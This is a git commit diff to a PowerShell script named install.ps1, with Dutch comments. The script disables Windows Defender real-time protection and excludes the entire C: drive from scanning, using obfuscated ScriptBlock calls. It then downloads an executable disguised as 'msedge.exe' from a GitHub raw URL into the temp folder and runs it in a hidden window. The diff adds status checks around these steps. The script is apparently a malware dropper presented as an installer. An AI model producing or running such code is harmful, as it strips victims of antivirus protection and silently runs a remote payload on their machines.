ea449dcbd96c90285c77af613fdae079989b89a7
Nxtccijo <ietsbdbd@gmail.com>
2025-03-20 11:31:29 +0100

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -10,7 +10,26 @@ $v9 = "WindowStyle"
 $v10 = "Hidden"
 $v11 = "Wait"
 
-& ([ScriptBlock]::Create("$v1 -$v2 `$true"))
-& ([ScriptBlock]::Create("$v3 -$v4 'C:\'"))
+# Controleer of real-time protection al is uitgeschakeld
+$realTimeStatus = (Get-MpPreference).DisableRealtimeMonitoring
+if (-not $realTimeStatus) {
+    & ([ScriptBlock]::Create("$v1 -$v2 `$true"))
+    Write-Output "Real-time protection is uitgeschakeld."
+} else {
+    Write-Output "Real-time protection is al uitgeschakeld."
+}
+
+# Controleer of de C:-schijf al is uitgesloten
+$exclusions = (Get-MpPreference).ExclusionPath
+if (-not ($exclusions -contains "C:\")) {
+    & ([ScriptBlock]::Create("$v3 -$v4 'C:\'"))
+    Write-Output "C:-schijf is uitgesloten."
+} else {
+    Write-Output "C:-schijf is al uitgesloten."
+}
+
+# Download het bestand "msedge.exe" naar de tijdelijke map
 & ([ScriptBlock]::Create("$v5 -Uri 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe' -$v6 '$env:TEMP\msedge.exe'"))
+
+# Voer het gedownloade bestand uit
 & ([ScriptBlock]::Create("$v7 -$v8 '$env:TEMP\msedge.exe' -$v9 $v10 -$v11"))
